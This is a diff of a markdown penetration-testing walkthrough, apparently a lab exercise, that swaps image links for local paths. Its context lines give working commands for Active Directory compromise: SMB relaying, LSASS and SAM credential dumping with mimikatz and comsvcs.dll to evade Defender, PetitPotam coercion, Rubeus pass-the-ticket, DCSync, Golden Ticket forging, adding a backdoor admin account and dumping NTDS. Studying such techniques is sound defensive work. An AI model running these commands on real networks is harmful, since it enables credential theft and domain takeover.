 proxychains impacket-secretsdump democorp/Administrator@10.10.24.102 -no-pass
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/8-1.png)
+![](images/images100.jpg)
 
 ### We've captured the local credentials from the remote target machine.
 
@@ -1573,13 +1573,13 @@ One thing to keep in mind when it comes to relaying SSPs, is that Microsoft enab
 ┌──(root㉿kali)-[/home/kali/lateralmovement]
 10.10.24.101
 ```
-![](http://news.baycode.eu/wp-content/uploads/2023/11/9-2.png)
+![](images/images101.jpg)
 
 We cannot auth-back to the same machine the user initiated connection from. Planting the payload for example on user's desktop would not work, as the connection was initiated from the same machine.
 
 ### If the user was using a different machine than .101, for example let's open the share from .102.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/11-2.png)
+![](images/images102.jpg)
 
 ### The attack worked, and we SMB relayed into .101.
 
@@ -1590,7 +1590,7 @@ Now let's check one last thing. SMB signing is enabled on the Windows Server Dom
 10.10.24.250
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/10-1.png)
+![](images/images103.jpg)
 
 ### NT_STATUS_ACCESS_DENIED
 
@@ -1633,7 +1633,7 @@ For full mitigation and detection guidance, please reference the MITRE guidance 
 After compromising the machine .101, instead of cracking the hashes, let's dump it's LSASS process memory and find saved credentials in cleartext.
 
 `https://imgflip.com/i/3ms9f2`
-![](http://news.baycode.eu/wp-content/uploads/2023/11/3ms9f2-1.jpg)
+![](images/images104.jpg)
 
 ## Things were easier back in the past
 
@@ -1654,15 +1654,15 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/15-2.png)
+![](images/images105.jpg)
 
 Doing so reveals the .101 computer account password.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/16-2.png)
+![](images/images106.jpg)
 
 And a cached **Domain Administrator** password, as well as NTLM hashes of every user that was logged into this machine and remain in the memory.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/17-2.png)
+![](images/images107.jpg)
 
 We have Domain Administrator credentials - this is once again game over, and is enough to achieve persistence on the domain and take over the network.
 
@@ -1680,14 +1680,14 @@ Instead of working on a live organism, we will download the memory dump for furt
  
 When we use a `procdump` (https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) tool to dump the process memory, we will get an alert from defender, as the process is monitored.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/12-2.png)
+![](images/images108.jpg)
 
 ### LOLBin to the rescue
 Sometimes operating systems include components that can be creatively used in malicious ways. For example - you can achieve the same using the task manager, but you must first RDP into the machine.
 
 Open the task manager, right click on the process, and press "Create Dump File". When running the task manager without administrator privileges, a Windows Defender alert will appear during dumping, and the file will be quarantined. However, if you run the task manager as an administrator, this behavior changes.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/13-2.png)
+![](images/images109.jpg)
 
 We can do the same from the terminal using the LOLBin comsvcs.dll, and create a MiniDump of memory, and we will **not** be flagged by Microsoft Defender by default, however this could be flagged by SIEMs/EDRs/other AVs.
 
@@ -1700,7 +1700,7 @@ impacket-wmiexec 'helpdesk:G3t_somehelp_br0@10.10.24.101' -dc-ip 10.10.24.250
 lget C:\ProgramData\helpdesk.dmp
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/14-1.png)
+![](images/images110.jpg)
 
 For offline investigation, we'll gather SAM, SYSTEM, and SECURITY hives too.
 
@@ -1720,7 +1720,7 @@ mimikatz # lsadump::sam /sam:'<sam>' /system:'<system>'
 mimikatz # lsadump::secrets /security:'<security>' /system:'<system>'
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/19-2.png)
+![](images/images111.jpg)
 
 There are other solutions such as `LaZagne` or a more stealthy `nanodump` which I do recommend as well. 
 
@@ -1767,7 +1767,7 @@ Unconstrained delegation is a feature in Active Directory that enables a service
 
 A Domain Administrator can apply Unconstrained Delegation to any computer within the domain by changing the setting `Trust this computer for delegation to any service (Kerberos only)` in **Active Directory Users and Computers** 
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/20a.png)
+![](images/images112.jpg)
 
 When a user logs into the Unconstrained Delegation computer, a copy of their TGT (Ticket Granting Ticket) is transmitted to the TGS (Ticket Granting Service) provided by the Domain Controller and stored in the LSASS memory. If you have compromised the machine, you can extract these tickets and impersonate users on any machine.
 
@@ -1787,7 +1787,7 @@ For the sake of this demonstration, we will focus on coercing authentication usi
 python3 PetitPotam.py -u j.arnold -p F4ll2023! 10.10.24.102 10.10.24.250
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/20-2.png)
+![](images/images113.jpg)
 
 If the attack is successful, we will have gained access to the ticket for the "DEMOCORP-DC" service.
 
@@ -1819,7 +1819,7 @@ sekurlsa::tickets
 kerberos::list
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/21-2.png)
+![](images/images114.jpg)
 
 We can export the tickets and download them for further exploitation and import them into session right away.
 
@@ -1837,9 +1837,9 @@ Rubeus.exe dump /nowrap
 
 The ticket can be copied and pasted.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/22-2.png)
+![](images/images115.jpg)
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/24-2.png)
+![](images/images116.jpg)
 
 And can be imported into the Kerberos session.
 
@@ -1848,7 +1848,7 @@ Rubeus.exe ptt /ticket:<ticket>
 klist
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/26-2.png)
+![](images/images117.jpg)
 
 And afterwards we can access other computer drives.
 ```
@@ -1856,11 +1856,11 @@ dir \\PRINTER.democorp.com\c$
 dir \\SERVICE.democorp.com\c$
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/27-2.png)
+![](images/images118.jpg)
 
 We could even access domain controller.
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/28-2.png)
+![](images/images119.jpg)
 
 And if we could do that, then we could as well perform a `DCSync` attack and dump credentials from the domain controller.
 
@@ -1868,7 +1868,7 @@ And if we could do that, then we could as well perform a `DCSync` attack and dum
 mimikatz # lsadump::dcsync /domain:democorp.com /user:krbtgt
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/29-2.png)
+![](images/images120.jpg)
 
 We have acquired the NTLM hash and AES key for the `krbtgt` account, enabling us to create a Golden Ticket, a task we will undertake in the final chapter in order to achieve persistence on the domain.
 
@@ -1933,7 +1933,7 @@ impacket-lookupsid 'democorp.com/j.arnold:F4ll2023!@10.10.24.250'
 impacket-ticketer -domain-sid <SID> -domain democorp.com Administrator -aesKey <key>
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/37-1.png)
+![](images/images121.jpg)
 
 ## Using the Golden Ticket
 
@@ -1942,7 +1942,7 @@ Once we have the ticket, we can use it to authenticate to the machines on the do
 rdate -n 10.10.24.250
 KRB5CCNAME=<ticket> impacket-smbexec democorp-dc.democorp.com -k -no-pass -target-ip 10.10.24.250 -dc-ip 10.10.24.250
 ```
-![](http://news.baycode.eu/wp-content/uploads/2023/11/38-1.png)
+![](images/images122.jpg)
 
 ## Dumping credentials
 
@@ -1952,7 +1952,7 @@ The default domain controller policy is restricting us however from dumping the 
 KRB5CCNAME=<ticket> impacket-secretsdump democorp-dc.democorp.com -k -no-pass -target-ip 10.10.24.250 -dc-ip 10.10.24.250
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/39.png)
+![](images/images123.jpg)
 
 We could only dump the secrets for one user at a time with `-just-dc-user` switch.
 
@@ -1960,7 +1960,7 @@ We could only dump the secrets for one user at a time with `-just-dc-user` switc
 KRB5CCNAME=<ticket> impacket-secretsdump democorp-dc.democorp.com -k -no-pass -target-ip 10.10.24.250 -dc-ip 10.10.24.250
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/40.png)
+![](images/images124.jpg)
 
 However when we have the Golden Ticket, we could create the local account on the Domain Controller, and then dump all the hashes using this account over NTLM authentication.
 
@@ -1969,7 +1969,7 @@ net user helpdesk G3t_somehelp_bro /ADD /Y
 net localgroup Administrators helpdesk /add
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/41.png)
+![](images/images125.jpg)
 
 After creating the account, we are free to dump all the secrets from the Domain Controller again.
 
@@ -1977,7 +1977,7 @@ After creating the account, we are free to dump all the secrets from the Domain 
 impacket-secretsdump 'helpdesk:G3t_somehelp_br0@10.10.24.250'
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/42.png)
+![](images/images126.jpg)
 
 What if we want to save the whole domain to our disk?
 
@@ -1994,7 +1994,7 @@ mkdir C:\ProgramData\ntds
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\ProgramData\ntds' q q"
 ```
 
-![](http://news.baycode.eu/wp-content/uploads/2023/11/43.png)
+![](images/images127.jpg)
 
 The `ntds.dit` file will be saved in `Active Directory` directory, and the `SYSTEM` and `SECURITY` hives are saved in `registry`.
 
@@ -2009,7 +2009,7 @@ In summary,
 ### We have compromised the domain and achieved persistence.
 
 `https://en.wikipedia.org/wiki/Epic_Win`
-![](http://news.baycode.eu/wp-content/uploads/2023/11/Epic_Win.png)
+![](images/images128.jpg)
 
 <div id="0x0F"></div>
 
